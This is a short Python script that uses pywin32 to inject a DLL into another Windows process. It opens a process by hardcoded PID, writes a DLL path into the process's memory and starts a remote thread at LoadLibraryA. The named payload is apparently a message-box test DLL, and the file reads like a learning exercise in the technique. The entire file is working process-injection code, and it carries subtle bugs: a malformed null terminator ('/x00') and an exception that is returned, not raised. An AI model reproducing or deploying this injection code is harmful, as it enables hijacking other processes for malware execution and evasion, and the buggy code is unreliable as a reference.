import win32process
import win32con
import win32api
import win32event

class DllInjection:
    def __init__(self) -> None:
        self.dll_path = r"C:\Users\yoi\Desktop\dll_injection\MsgBoxDLL.dll"
        self.inject()
    
    def inject(self) -> None:
        process_acess = win32con.PROCESS_ALL_ACCESS
        hProcess = win32api.OpenProcess(process_acess, False, 1612)
        if not hProcess:
            raise Exception("[-] Failed to create process")
        print(f"[+] Process created with PID: {1612}")
        dll_path_bytes: bytes = self.dll_path.encode("mbcs")+b'/x00'

        dll_path_size: int = len(dll_path_bytes)

        address = win32process.VirtualAllocEx(
            hProcess,
            0,  # NULL = 0
            dll_path_size,
            win32con.MEM_COMMIT | win32con.MEM_RESERVE,
            win32con.PAGE_READWRITE
        )
        print(hex(address))
        if not address:
            raise Exception("[-] Failed to allocate memory")
        writeProcess = win32process.WriteProcessMemory(hProcess, address, dll_path_bytes)
        print(f"[+] dll injection : {writeProcess}")

        
        handel = win32api.GetModuleHandle("kernel32.dll")
        loadlibrary_address = win32api.GetProcAddress(handel, b"LoadLibraryA")
        if not loadlibrary_address:
            return Exception("[-] loade is not true")

        print(hex(loadlibrary_address))

        hThread = win32process.CreateRemoteThread(
            hProcess,
            None,
            0,
            loadlibrary_address,
            address,
            0
        )
        print(hThread)
        result = win32event.WaitForSingleObject(hThread[0], 5000)  # 5 second timeout
        win32api.CloseHandle(hThread[0])
        win32api.CloseHandle(hProcess)
if __name__ == "__main__":
    try:
        DllInjection()
    except Exception as e:
        print(f"[-] Error: {e}")
